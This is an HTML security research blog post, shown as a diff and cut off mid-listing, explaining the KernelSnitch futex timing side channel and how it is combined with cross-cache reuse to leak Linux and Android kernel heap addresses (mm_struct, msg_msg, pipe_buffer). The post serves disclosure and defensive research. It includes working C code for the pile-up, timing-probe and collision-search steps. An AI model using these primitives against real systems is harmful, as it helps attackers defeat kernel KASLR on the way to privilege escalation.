@@ -1,0 +1,1581 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Software-only KernelSnitch side channel plus cross-cache reuse leaks heap KASLR (msg_msg/pipe_buffer) across Linux environments and Android.">
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="../../styles/base.css">
+  <link rel="stylesheet" href="../../styles/article.css">
+
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
+
+  <title>Heap KASLR Leaks | Lukas Maar</title>
+
+</head>
+
+<body class="article-page">
+  {{TOPBAR}}
+
+  <main class="article-shell">
+    <article class="article-frame">
+      <div class="article-kicker">Security Blog</div>
+      <h1 class="article-title">From KernelSnitch to Practical msg_msg/pipe_buffer Heap KASLR Leaks</h1>
+
+      <div class="article-meta">
+        <strong>Lukas Maar</strong><br>
+        <span>Published: April 10, 2026</span>
+      </div>
+
+      <p>
+        This post presents a practical heap KASLR leak that does not rely on a memory-safety vulnerability.
+        I start from KernelSnitch, a software-only timing side channel that recovers the location of the current's <code>mm_struct</code> and, from it, the base of the backing <code>mm_cachep</code> slab page.
+        I then combine that leak with same-page-order cross-cache reuse to pivot into exploit-relevant targets such as <code>msg_msg</code> and <code>pipe_buffer</code>.
+        The result is a broadly applicable leak primitive that works across native Linux systems, virtualized KernelCTF setups, restricted Android environments, and both x86_64 and aarch64.
+        Because the attack recovers valid kernel pointers without triggering invalid accesses, it remains exploitable on systems with MTE.
+        More importantly, when the leaked <code>mm_struct</code> pointer is tagged (e.g., on Google Pixels), KernelSnitch can recover its logical tag as well, highlighting its potential as a tag oracle for the leaked object.
+      </p>
+
+      <h2 id="story">From KernelSnitch to Practical msg_msg/pipe_buffer Heap KASLR Leaks</h2>
+
+      <p>
+        In this post, I combine <a href="../../publications/ndss25-kernelsnitch.pdf">KernelSnitch</a> with <a href="https://projectzero.google/2021/10/how-simple-linux-kernel-memory.html">cross-cache reuse</a> to leak the location of <code>msg_msg</code> or <code>pipe_buffer</code> objects, both widely used in kernel exploits.
+        In these attacks (and others), knowing exact object locations is valuable, and this is where the attack presented here becomes relevant.
+        I evaluate the approach on nine environments: five native deployments and four virtualized setups.
+      </p>
+
+      <ul>
+          <li><strong>Native Systems</strong>
+            <ul>
+              <li>ThinkPad P14s Gen 4
+                <ul>
+                  <li>Ubuntu kernel 6.5.0-14-generic</li>
+                  <li>Ubuntu kernel 6.8.0-101-generic</li>
+                </ul>
+              </li>
+              <li>ThinkPad P14s Gen 5
+                <ul>
+                  <li>Fedora kernel 6.18.13-200.fc43</li>
+                </ul>
+              </li>
+              <li>Raspberry Pi 3
+                <ul>
+                  <li>Debian kernel 6.12.47+rpt-rpi-v8</li>
+                </ul>
+              </li>
+              <li>Google Pixel 8a
+                <ul>
+                  <li>Android kernel 6.1.145-android14-11-gc1de4747ac59-ab14219743</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+          <li><strong>Virtualized Systems</strong>
+            <ul>
+              <li>Buildroot
+                <ul>
+                  <li>Linux kernel 6.12.66</li>
+                </ul>
+              </li>
+              <li>KernelCTF LTS instances
+                <ul>
+                  <li>lts-6.1.81</li>
+                  <li>lts-6.6.98</li>
+                  <li>lts-6.12.77</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+      </ul>
+
+      <p>
+        A key goal of this project is to minimize system-specific dependencies and make this heap KASLR leak as universal as possible.
+        The proof of concept therefore remains largely unchanged across these environments, and I have open-sourced the full <a href="https://github.com/lukasmaar/kernelsnitch">source code</a>.
+        Specifically, the attack consists of an initial system-dependency estimation and the actual exploit (i.e., KernelSnitch plus cross-cache reuse), as demonstrated in the screen recordings of four instances shown in Figures 1 to 4.
+        For the evaluation, I observed a high success rate that is suitable for practical use.
+      </p>
+
+      <div class="article-note">
+        <strong>Disclaimer:</strong>
+        I responsibly disclosed KernelSnitch three times: once before the <a href="../../publications/ndss25-kernelsnitch.pdf">NDSS publication</a>, once shortly after the <a href="../../slides/nullcon25-sidechannels.pdf">Nullcon Berlin talk</a>, and once to <a href="https://issuetracker.google.com/issues/490070037">Google</a> while developing this broader leak pipeline.
+        After the last disclosure, Google classified the issue as not a security vulnerability.
+        I am publishing this write-up for reporting transparency and to support defensive research.
+        This blog post is provided strictly for educational and defensive-security purposes and is not intended for malicious use.
+        I made my best effort to report these issues responsibly.
+      </div>
+
+      <h2 id="tldr">TL;DR</h2>
+
+      <ul>
+        <li>
+          <strong>Portable Core Leak:</strong>
+          KernelSnitch is a software-only timing side channel that leaks <code>mm_struct</code>-backed page locations without relying on a memory-safety bug.
+          The proof of concept is applicable to all evaluated Linux environments and two architectures (i.e., x86_64 and aarch64), from Ubuntu and Fedora desktop to sandboxed KernelCTF and Android mobile with a near-100% success rate for this stage.
+        </li>
+        <li>
+          <strong>Practical Leak Pivot:</strong>
+          With cross-cache reuse, I turn that core leakage primitive into practical <code>msg_msg</code>/<code>pipe_buffer</code> heap KASLR leaks.
+          It is largely applicable with high reliability above 98% on Desktop and KernelCTF environments as-is.
+          For Android, I apply a few target-specific adjustments and show practical applicability even in the <code>untrusted_app</code> security context.
+        </li>
+        <li><strong>Security Implication:</strong>
+          This leakage class remains exploitable even with defenses like MTE, because it does not perform any invalid tagged memory accesses.
+          More importantly, when the leaked <code>mm_struct</code> pointer is tagged, KernelSnitch can recover its logical tag as well, highlighting its potential as a tag oracle for the leaked object.
+        </li>
+      </ul>
+      
+      <div class="article-video-grid">
+        <figure class="article-video-card">
+          <video class="article-video" muted loop playsinline controls preload="metadata">
+            <source src="run-fedora.webm" type="video/webm">
+          </video>
+          <div class="caption">Figure 1: Fedora v6.18 execution flow (<code>msg_msg</code>).</div>
+        </figure>
+        <figure class="article-video-card">
+          <video class="article-video" muted loop playsinline controls preload="metadata">
+            <source src="run-kernelctf.webm" type="video/webm">
+          </video>
+          <div class="caption">Figure 2: KernelCTF v6.12 execution flow (<code>msg_msg</code>).</div>
+        </figure>
+      </div>
+      
+      <div class="article-video-grid">
+        <figure class="article-video-card">
+          <video class="article-video" muted loop playsinline controls preload="metadata">
+            <source src="run-kernelctf-pipe.webm" type="video/webm">
+          </video>
+          <div class="caption">Figure 3: KernelCTF v6.12 execution flow (<code>pipe_buffer</code>).</div>
+        </figure>
+        <figure class="article-video-card">
+          <video class="article-video" muted loop playsinline controls preload="metadata">
+            <source src="run-app.webm" type="video/webm">
+          </video>
+          <div class="caption">Figure 4: Android <code>untrusted_app</code> execution flow (<code>pipe_buffer</code>). Here, the second terminal is for validation the leaked `pipe_buffer` address, showing the correct slab `kmalloc-cg-1k` owner</div>
+        </figure>
+      </div>
+
+      <h2 id="overview">Overview</h2>
+
+      <nav class="toc" aria-label="Table of contents">
+        <ul>
+          <li>
+            <a href="#leak-mm-struct">KernelSnitch: Leaking mm_struct Locations</a>
+            <ul>
+              <li><a href="#linked-lists">Linked Lists in the Linux Kernel</a></li>
+              <li><a href="#hash-tables">Hash Tables in the Linux Kernel</a></li>
+              <li><a href="#futex-hash-table">Hash Table for Fast User Mutexes (Futex)</a></li>
+              <li><a href="#futex">Futex Wait and Wake</a></li>
+              <li><a href="#shaping">Shaping the Futex Hash Table with Wait</a></li>
+              <li><a href="#correlate">Correlate Futex Wake Timing with Kernel Addresses</a></li>
+              <li><a href="#bruteforce">Brute-force mm_struct</a></li>
+            </ul>
+          </li>
+          <li>
+            <a href="#cross-cache-reuse">Cross-Cache Reuse to Same-Page-Order Targets</a>
+            <ul>
+              <li><a href="#kernel-memory-insights">Heap Segregation and Memory Hierarchy</a></li>
+              <li><a href="#slub-internals">SLUB Internals</a></li>
+              <li><a href="#return-to-pcp">Returning the Leaked Slab Page to PCP</a></li>
+              <li><a href="#reclaiming">Reclaiming as Target Objects</a></li>
+            </ul>
+          </li>
+          <li>
+            <a href="#eval">Evaluation</a>
+            <ul>
+              <li><a href="#mm-estimator">Estimator of mm_struct</a></li>
+              <li><a href="#results-kernelsnitch">KernelSnitch-Only Results</a></li>
+              <li><a href="#results-environments">Combined Evaluation: KernelSnitch + Cross-Cache Reuse</a></li>
+              <li><a href="#android">Results on Android</a></li>
+              <li><a href="#mte">MTE Implications</a></li>
+              <li><a href="#runtime">Runtime Results</a></li>
+            </ul>
+          </li>
+          <li><a href="#conclusion">Conclusion</a></li>
+          <li><a href="#references">Useful References</a></li>
+        </ul>
+      </nav>
+
+      <h2 id="leak-mm-struct">KernelSnitch: Leaking mm_struct Locations</h2>
+
+      <p>
+        It all started with a discussion I had with <a href="https://gruss.cc/">Daniel Gruss</a> in 2023 about operating-system side channels.
+        The key takeaway from that discussion was straightforward: when you zoom out and look at the operating system from a high level, the kernel resembles hardware in many important ways.
+        In both worlds, everything flows through shared resources.
+        In hardware, those shared resources are things like CPU caches and execution units.
+        In the kernel, they show up as shared data structures, locks, and software caches.
+        The kernel keeps optimizing the same fundamentals that hardware does: runtime and memory overhead, with the goal of delivering the best possible performance to end users.
+        Once you adopt that lens, we should expect more operating-system side channels, because every shared resource has the potential to become a timing channel in disguise.
+        In other words, the same fundamentals that make systems fast and scalable can also become susceptible under the right probing strategy.
+        That perspective stuck with me and, in 2024, set the direction for <a href="../../publications/ndss25-kernelsnitch.pdf">KernelSnitch</a>.
+        With that in mind, I started by looking at one of the most fundamental building blocks in computer science: the <i>linked list</i>.
+      </p>
+
+      <h3 id="linked-lists">Linked Lists in the Linux Kernel</h3>
+
+      <p>
+        A linked list is a dynamic data structure where each element stores references to neighboring elements.
+        In Linux, they are used in many subsystems to store sets of objects, such as queues and cache-managed objects.
+        Linux standardizes this pattern through <code>list_head</code> (or alternatives like <code>plist_head</code>), its core linked-list primitive.
+      </p>
+
+      <p>
+        As most of us learned at some point, traversing a linked list with non-matching comparisons is an <code>O(n)</code> operation.
+        That gives us a simple but powerful timing side-channel primitive: by timing these <code>O(n)</code> traversals, we can estimate how many elements are present.
+        The challenge is turning that primitive into a heap KASLR leak.
+        That is a big leap.
+        We start from a general observation (longer list takes longer time) and push it towards a security-relevant outcome (recovering a kernel address).
+        The key to achieve this is to go beyond "there is a timing difference".
+        <i>Rather, our goal is to make that timing difference measurable and stable enough to consistently correlate traversal timing with a secret kernel address.</i>
+        Concretely, we need:
+      </p>
+
+      <ul>
+        <li> A code path where traversal length depends on the location of a kernel heap object whose address we ultimately want to infer.</li>
+        <li> To amplify the effect so it becomes visible through a user-accessible syscall interface, because traversal happens in kernel space.</li>
+      </ul>
+
+      <p>
+        This naturally leads to the question: <i>where does the kernel use linked-list-style traversals in a way that depends on a kernel heap object's address?</i>
+        A plain linked list usually gives us length, not location.
+        So we need a setting where an address influences <i>which</i> list we traverse and <i>how long</i> that traversal becomes.
+        Linux hash tables provide exactly that bridge.
+      </p>
+
+      <h3 id="hash-tables">Hash Tables in the Linux Kernel</h3>
+
+      <p>
+        A hash table stores key-value entries in buckets chosen by a hash function.
+        In Linux, hash tables are typically implemented as bucket arrays where collisions are handled by linked-list chaining, so traversing a busy bucket is still an <code>O(n)</code> walk.
+        For this attack, the key property is that bucket indices depend on kernel addresses, which creates address-dependent traversal behavior.
+        After digging through candidate kernel hash tables with <a href="https://elixir.bootlin.com">Bootlin</a> and <a href="https://codeql.github.com/">CodeQL</a> (this was in 2024, so mostly old-school code archaeology), one target stood out: the <i>futex hash table</i>.
+        As you will see later, it has a combination of properties that makes it an especially attractive target.
+      </p>
+
+      <h3 id="futex-hash-table">Hash Table for Fast User Mutexes (Futex)</h3>
+
+      <p>
+        The <a href="https://man7.org/linux/man-pages/man2/futex.2.html">futex</a> subsystem uses a hash table to manage futex metadata.
+        A futex (short for <em>fast userspace mutex</em>) is a synchronization primitive where uncontended locking stays in user space, while the kernel only steps in for contended cases such as wait and wake operations.
+        Conceptually, futex waiters are organized through a hash table for efficient lookup by futex key.
+        In this subsystem, futexes use priority linked lists (i.e., <code>plist_head</code>): Bucketed lookup with collision chains that require traversal, and therefore expose timing behavior tied to the number of elements in a bucket.
+        For indexing, Linux first derives an internal futex key and then hashes that key to select a bucket.
+        At a high level, the key combines user-provided inputs (e.g., the futex user address) with kernel-side context.
+        For the attack relevant private futex, the kernel-side context is the memory management kernel object, <code>mm_struct</code>.
+      </p>
+
+      <p>
+        From a security perspective, this is exactly what makes futex hashing interesting: bucket selection depends partly on attacker-controlled input and partly on a kernel address.
+        Let's take a deeper dive into how the Linux kernel implements this indexing.
+        The next listings are implementation-heavy, so I will focus only on the fields and paths that are exploit-relevant.
+      </p>
+
+      <pre><code class="language-c">struct futex_hash_bucket {
+    [...]
+    atomic_t waiters;
+    struct plist_head chain;
+} ____cacheline_aligned_in_smp;
+
+static struct {
+    struct futex_hash_bucket *queues;
+    unsigned long            hashsize;
+} __futex_data __read_mostly __aligned(2*sizeof(long));
+#define futex_queues   (__futex_data.queues)
+#define futex_hashsize (__futex_data.hashsize)
+
+static int __init futex_init(void)
+{
+    [...]
+    futex_hashsize = roundup_pow_of_two(256 * num_possible_cpus());
+
+    futex_queues = alloc_large_system_hash("futex", sizeof(*futex_queues),
+                                           futex_hashsize, 0, 0,
+                                           &futex_shift, NULL,
+                                           futex_hashsize, futex_hashsize);
+    [...]
+}</code></pre>
+      <div class="caption">Listing 1: The futex hash table.</div>
+
+      <p>
+        Listing 1 shows how the futex hash table is stored in memory.
+        Each bucket is a <code>futex_hash_bucket</code> and stores a priority-list chain of waiters.
+        The global futex object then exposes two core parameters: <code>futex_queues</code> (pointer to the bucket array) and <code>futex_hashsize</code> (number of buckets).
+        During <code>futex_init</code>, the kernel computes a power-of-two table size, allocates the bucket array and initializes every bucket.
+        This setup is the foundation that later lets <code>futex_hash()</code> map a key to a concrete bucket index.
+      </p>
+
+      <pre><code class="language-c">union futex_key {
+    [...]
+    struct {
+        union {
+            struct mm_struct *mm;
+            [...]
+        };
+        unsigned long address;
+        unsigned int offset;
+    } private;
+    [...]
+};
+
+int get_futex_key(u32 __user *uaddr, unsigned int flags, union futex_key *key,
+                  enum futex_access rw)
+{
+    unsigned long address = (unsigned long)uaddr;
+    [...]
+    // PROCESS_PRIVATE
+    key->both.offset = address % PAGE_SIZE;
+    key->private.address = address - key->both.offset;
+    key->private.mm = current->mm;
+    [...]
+}
+
+struct futex_hash_bucket *futex_hash(union futex_key *key)
+{
+    u32 hash = jhash2((u32 *)key, offsetof(typeof(*key), both.offset) / 4,
+                      key->both.offset);
+    return &futex_queues[hash & (futex_hashsize - 1)];
+}</code></pre>
+      <div class="caption">Listing 2: Futex key composition and bucket indexing in <code>futex_hash()</code> (compacted).</div>
+
+      <p>
+        Listing 2 shows the full path from futex input to bucket selection.
+        <code>get_futex_key</code> starts from the user-provided futex address (<code>uaddr</code>), derives page-relative metadata.
+        In the private-futex path it combines <code>key->private.address</code> (user-provided) with <code>key->private.mm = current->mm</code> (kernel-internal process context).
+        The resulting key is then passed to <code>futex_hash()</code>, which applies <code>jhash2</code> and maps the hash into the bucket array.
+        Under the hood, both core futex operations, putting a thread to sleep (wait) and waking it up (wake), use this same <code>get_futex_key()</code> plus <code>futex_hash()</code> pipeline, as you can see in the following sections.
+      </p>
+
+      <p>
+        <strong>Compatibility note (Linux version 6.16+):</strong>
+        Newer kernels introduced a variant for private futex hashing that can avoid using <code>current-&gt;mm</code> in the bucket index.
+        However, this path can be generically disabled by setting the private futex hash table to zero slots (unprivileged), which restores the mm-dependent indexing behavior used throughout this post.
+      </p>
+
+      <h3 id="futex">Futex Wait and Wake</h3>
+
+      <p>
+        From user space, both paths are reached via the same syscall interface: <code>syscall(SYS_futex, uaddr, op, ...)</code>.
+        When <code>op</code> is <code>FUTEX_WAIT</code>, the kernel enters the wait path (eventually <code>futex_wait</code>).
+        When <code>op</code> is <code>FUTEX_WAKE</code>, it enters the wake path (eventually <code>futex_wake</code>).
+      </p>
+
+<pre><code class="language-c">int futex_wait(u32 __user *uaddr, unsigned int flags, u32 val, ktime_t *abs_time, u32 bitset)
+{
+    union futex_key key = FUTEX_KEY_INIT;
+    struct futex_hash_bucket *hb;
+    int ret;
+    [...]
+    ret = get_futex_key(uaddr, flags, &key, FUTEX_READ);
+    [...]
+    hb = futex_hash(&key);
+    [...]
+    futex_wait_queue(hb);
+    [...]
+    return ret;
+}</code></pre>
+      <div class="caption">Listing 3: Using futex wait to put a thread to sleep (compacted).</div>
+
+      <p>
+        Listing 3 shows the essential wait-side path in compact form.
+        The kernel first derives a futex key from user input via <code>get_futex_key</code>.
+        It then maps that key to a specific bucket with <code>futex_hash</code>.
+        Finally, <code>futex_wait_queue</code> enqueues the current thread on that bucket and puts it to sleep.
+        For the attack, this is the key sequence.
+        So each <code>futex_wait</code> call deterministically places one waiter into a bucket selected by attacker-controlled input (<code>uaddr</code>) plus per-process kernel state (notably <code>mm_struct</code>), and therefore makes further traversal of this bucket longer.
+      </p>
+
+      <pre><code class="language-c">int futex_wake(u32 __user *uaddr, unsigned int flags, int nr_wake, u32 bitset)
+{
+    struct futex_hash_bucket *hb;
+    struct futex_q *this, *next;
+    union futex_key key = FUTEX_KEY_INIT;
+    int ret;
+
+    ret = get_futex_key(uaddr, flags, &key, FUTEX_READ);
+    [...]
+    hb = futex_hash(&key);
+    [...]
+    plist_for_each_entry_safe(this, next, &hb->chain, list) {
+        if (futex_match(&this->key, &key)) {
+            [...]
+            this->wake(this);
+            [...]
+        }
+    }
+    [...]
+}</code></pre>
+      <div class="caption">Listing 4: Using futex wake to wake one or more threads up (compacted).</div>
+
+      <p>
+        For the wake-side flow (see Listing 4), the kernel resolves the key again and traverses the selected bucket to find matching waiters.
+        This is the critical timing measurement point.
+        <code>futex_wake</code> recomputes the key, hashes into a bucket, and then iterates over <code>hb->chain</code> with <code>plist_for_each_entry_safe</code> until matching entries are found.
+        In particular, it leaks an estimate of list occupancy when traversed entries do <strong>not</strong> match the requested key, because each non-match adds another comparison step before wake-up handling can terminate.
+        By controlling how many colliding futexes end up in the same bucket, an attacker can influence the amount of traversal work and observe timing differences from user space.
+      </p>
+
+      <p>
+        In short, both futex operations share the same key and hash pipeline, but they serve different roles for the attack.
+        The wait path helps shape bucket occupancy, while the wake path exposes measurable traversal time that reflects non-matching work in the bucket.
+        Together, they provide the signal path to infer kernel-address-dependent state.
+        At this point, we have covered the relevant kernel internals for KernelSnitch.
+        The rest of this core leakage attack now moves to user space: we will drive these same kernel paths through carefully crafted syscall sequences, shape bucket state with wait operations, and extract timing signal with wake operations.
+      </p>
+
+      <h3 id="shaping">Shaping the Futex Hash Table with Wait</h3>
+
+      <p>
+        You remember from the previous section that I said the futex subsystem has useful exploitation-relevant properties.
+        Here is what I meant by that.
+        Listing 3 gives us the key shaping lever: every successful <code>futex_wait</code> inserts one waiter into the bucket's chain selected by <code>futex_hash(uaddr, current->mm)</code>.
+        To grow that chain, we spawn additional threads and let each thread call <code>futex_wait</code>.
+        This gives us two attacker-relevant properties.
+        First, <code>uaddr</code> is fully controlled from user space, while <code>current->mm</code> remains within one process.
+        That makes bucket placement controllable under the <code>mm_struct</code> context.
+        Second, the operation is repeatable with the same arguments.
+        By creating many threads that wait on the same <code>uaddr</code>, we can pile up many waiters in one specific bucket.
+        So, bucket occupancy, and therefore traversal work, becomes largely attacker-controlled.
+        This is our pile-up primitive (see Listing 5): controlled thread creation plus repeated <code>futex_wait</code> calls that intentionally grow one bucket chain and amplify traversal work.
+      </p>
+
+      <pre><code class="language-c">unsigned char pileup_futex[PAGE_SIZE];
+// Adds one waiter to futex_hash(pileup_futex, current-&gt;mm)
+static void *__enqueue_one_waiter(void *arg)
+{
+    size_t uaddr = (size_t)pileup_futex;
+    SYSCHK(syscall(SYS_futex, uaddr, FUTEX_WAIT_PRIVATE, 0, 0, 0, 0));
+    return 0;
+}
+
+// Spawns &lt;num_waiters&gt; threads to pile up one futex hash bucket
+void pile_up_primitive(size_t num_waiters)
+{
+    pthread_t tid;
+    for (size_t i = 0; i < num_waiters; ++i)
+        SYSCHK(pthread_create(&tid, 0, __enqueue_one_waiter, 0));
+    sched_yield(); sched_yield();
+}</code></pre>
+      <div class="caption">Listing 5: Pile-up primitive implementation.</div>
+
+      <h3 id="correlate">Correlate Futex Wake Timing with Kernel Addresses</h3>
+
+      <p>
+        After the pile-up step, one bucket is intentionally crowded while most others stay empty or lightly populated.
+        The key point here is that this crowded bucket is selected by <code>futex_hash(uaddr, current->mm)</code>.
+        In that expression, we control <code>uaddr</code> and we know the specific hash function (i.e., <code>jhash2</code>).
+        The only missing piece is <code>current->mm</code>.
+        So the next step is to correlate wake timing with candidate bucket indices until only the correct <code>mm_struct</code>-dependent mapping remains.
+      </p>
+
+      <p>
+        Before doing that, let's look at what <code>futex_wake</code> gives us as an attacker primitive.
+        One property is especially helpful: if we call <code>futex_wake</code> with an invalid <code>uaddr</code>, we get a non-destructive probe primitive.
+        That means we can trigger key/hash resolution and bucket traversal without consuming or removing waiters, so the bucket state remains intact across repeated measurements.
+        This lets us repeat measurements on bucket state and separate heavily populated buckets from lightly populated ones by timing.
+      </p>
+
+      <pre><code class="language-c">#define NUM_MEASUREMENTS 128
+#define NUM_AVG_SAMPLES (1<<3)
+// Comparator for ascending cycle counts
+static int __compare(const void *a, const void *b)
+{
+    return (*(size_t *)a - *(size_t *)b);
+}
+
+// Probes bucket occupancy via FUTEX_WAKE timing on an invalid uaddr
+size_t probe_primitive(size_t invalid_uaddr)
+{      
+    size_t t_start;
+    size_t t_end;
+    size_t total_cycles = 0;
+    static size_t samples[NUM_MEASUREMENTS];
+
+    for (size_t i = 0; i < NUM_MEASUREMENTS; ++i) {
+        sched_yield();
+        t_start = timer_begin();
+        SYSCHK(syscall(SYS_futex, invalid_uaddr, FUTEX_WAKE_PRIVATE, 0, 0, 0, 0));
+        t_end = timer_end();
+        samples[i] = t_end - t_start;
+    }
+
+    // Keep the lowest-latency window to suppress noisy outliers
+    qsort(samples, NUM_MEASUREMENTS, sizeof(samples[0]), __compare);
+    for (size_t l = 0; l < NUM_AVG_SAMPLES; ++l)
+        total_cycles += samples[l];
+    return total_cycles / NUM_AVG_SAMPLES;
+}</code></pre>
+      <div class="caption">Listing 6: Non-destructive probe primitive implementation.</div>
+
+      <p>
+        Listing 6 shows that I can turn the non-destructive probe primitive, combined with lightweight signal processing, into a robust leakage primitive.
+        Concretely, I repeat the measurement <code>NUM_MEASUREMENTS</code> times and time the syscall with a timing helper.
+        Finally, I apply lightweight signal processing to reject unstable samples and return a robust result.
+      </p>
+
+      <p>
+        With this probe primitive, I correlate timing with the <code>mm_struct</code> address in two phases: <i>online</i> and <i>offline</i>.
+        In the <i>online phase</i> (see Listing 7), we use the probe primitive to test many mapped user-space addresses and identify those that collide with the heavily piled-up bucket in the same process.
+        Since we heavily apply the pile-up primitive beforehand, timing for the collided bucket stands out clearly from wake timings of non-colliding buckets.
+        By combining pile-up and non-destructive probing, we get a robust way to detect hash collisions of different user addresses under the same <code>mm_struct</code> context.
+        This makes the approach portable across systems, because the collision signal and filtering strategy are resilient to system noise.
+        In the <i>offline phase</i> (see next section), we take the colliding <code>uaddr</code> set and brute-force candidate <code>mm_struct</code> values until the predicted hash-collision pattern matches the online observations.
+      </p>
+
+      <pre><code class="language-c">#define FUTEX_REGION_SIZE (64ULL << 30)
+#define PILEUP_WAITERS 4096
+#define TARGET_COLLISIONS 8
+#define THRESHOLD_MULTIPLIER 100
+
+unsigned char futex_region[FUTEX_REGION_SIZE];
+size_t colliding_futex_addrs[TARGET_COLLISIONS];
+
+void collect_colliding_futex_addrs(void)
+{
+    size_t found = 1;  // index 0 is the known colliding seed
+
+    // Baseline timing for an empty/light bucket
+    size_t baseline_time = MIN(
+        probe_primitive((size_t)&futex_region[0]),
+        probe_primitive((size_t)&futex_region[PAGE_SIZE + 8])
+    );
+
+    // Pile up one bucket to make collisions stand out
+    pile_up_primitive(PILEUP_WAITERS);
+
+    // Known colliding address for the piled-up bucket
+    colliding_futex_addrs[0] = (size_t)&pileup_futex;
+
+    // Find additional colliding addresses
+    for (size_t i = 1; found < TARGET_COLLISIONS; ++i) {
+        size_t offset = (i * PAGE_SIZE) | ((i * 8) % PAGE_SIZE);
+        if (offset >= FUTEX_REGION_SIZE)
+            break;
+
+        size_t candidate_addr = (size_t)&futex_region[offset];
+        size_t probe_time = probe_primitive(candidate_addr);
+
+        if (probe_time > baseline_time * THRESHOLD_MULTIPLIER) {
+            colliding_futex_addrs[found++] = candidate_addr;
+            pr_info("  collision with %016zx\n", candidate_addr);
+        }
+    }
+
+    assert(found == TARGET_COLLISIONS);
+}</code></pre>
+      <div class="caption">Listing 7: Finding hash collisions implementation (<i>online</i> phase).</div>
+
+      <h3 id="bruteforce">Brute-force mm_struct</h3>
+
+      <p>
+        At a high level, the offline search enumerates candidate <code>mm_struct</code> addresses and checks whether <code>futex_hash(uaddr, candidate_mm_struct)</code> reproduces the collision set found in the online phase, using a user-space reimplementation of the kernel's <code>jhash2</code>.
+        The candidate that consistently matches those observed collisions is the recovered <code>current->mm</code>.
+        Figure 5 illustrates this idea: almost all candidates stay near a low background score, while the correct candidate produces a clear, isolated peak.
+      </p>
+
+      <div class="article-figure" style="--figure-width: 60%;">
+        <img src="bruteforce_kernel_address.svg" class="article-figure-media">
+        <div class="caption">Figure 5: Collision-match score across candidate <code>mm_struct</code> addresses. The true candidate appears as a dominant peak.</div>
+      </div>
+
+      <p>
+        At first glance, brute-forcing the entire kernel virtual-address space for <code>mm_struct</code> seems prohibitively expensive.
+        The turning point is that allocator constraints remove most impossible candidates.
+        In other words, we <i>are not</i> searching arbitrary addresses.
+        Instead, we are searching addresses that satisfy the alignment and placement constraints of the allocator.
+        Kernel code shows that <code>mm_struct</code> objects are allocated from the dedicated slab cache <code>mm_cachep</code>.
+        So before continuing with brute-force reduction, we need a short allocator deep dive: how <code>mm_cachep</code> is backed by pages and how object addresses are aligned.
+      </p>
+
+      <p>
+        The exact alignment details are architecture-dependent (we consider x86_64, where other architectures behave similarly).
+        The allocation pipeline is layered.
+        Technically, Linux uses two allocators here: the slab allocator and the page allocator.
+        From an exploitation point of view, however, it is more useful to split the page allocator and think in three layers: the slab allocator, the per-CPU page lists (PCP), and the page (buddy) allocator.
+        The slab allocator is the fast path, while allocations fall back to lower layers as needed.
+        In this context, a slab cache (e.g., <code>mm_cachep</code>) is the per-context allocator.
+        A slab is one allocation unit of that cache and slab pages are the backing pages that hold the actual objects.
+        Most kernel heap allocations request object slots from slab caches, which obtain backing pages from PCP or, as a fallback, the buddy allocator.
+        Those physical pages are visible in the direct physical map (physmap), which is a linear kernel mapping of RAM.
+        Alignment constraints then appear at two levels for this attack: slab pages are aligned to allocation order (order-0: 4 KiB, order-1: 8 KiB, etc.) and objects inside the slab pages follow alignment rules (type alignment, rounded object size).
+        Valid <code>mm_struct</code> addresses must therefore satisfy these allocator-induced alignment and placement rules, not arbitrary virtual-address values.
+      </p>
+
+      <div class="article-figure" style="--figure-width: 50%;">
+        <img src="kernel_memory_alignment.svg" class="article-figure-media">
+        <div class="caption">Figure 6: Alignment path for <code>mm_struct</code> from physmap pages to slab-cache objects on x86_64.</div>
+      </div>
+
+      <p>
+        Figure 6 summarizes the alignment constraints for <code>mm_struct</code> placement.
+        Listing 8 then shows how these constraints are used in the brute-force loop.
+        On x86_64, physmap is randomized in a range between <code>0xffff888000000000</code> to <code>0xffffc87fffffffff</code>, so we enumerate candidate slab bases in that range.
+        For each slab base, we then test only valid object-slot offsets.
+        Let <code>mm_order = order(mm_cachep)</code> and <code>mm_slab_size = 1 << (12 + mm_order)</code>.
+        Then each candidate slab contributes <code>floor(mm_slab_size / sizeof(mm_struct))</code> possible <code>mm_struct</code> slots.
+        So the brute-force is no longer an unconstrained virtual-address scan: it is an allocator-constrained scan over <code>mm_order</code>-aligned slab bases and valid slot offsets per slab.
+        For instance, on Linux 6.8.0-101-generic, <code>mm_order=3</code>, <code>mm_slab_size=32 KiB</code>, and with <code>sizeof(mm_struct)=1408</code> this yields 23 slots.
+        This reduces the search space to about <code>2<sup>35.5</sup></code>, which makes the offline phase practical.
+      </p>
+
+      <pre><code class="language-c">#define PHYS_MAP_START 0xffff888000000000ULL
+#define PHYS_MAP_END 0xffffc88000000000ULL
+#define TARGET_COLLISIONS 8
+#define MM_ORDER 3
+#define MM_SLAB_SIZE (1ULL<<(12+MM_ORDER))
+#define MM_STRUCT_SIZE 1408
+uint32_t futex_hash(size_t addr, size_t mm);
+
+// Recovers mm_struct by matching observed futex collisions
+size_t recover_mm_struct_addr(void)
+{
+    for (size_t slab_base = PHYS_MAP_START; slab_base < PHYS_MAP_END; slab_base += MM_SLAB_SIZE) {
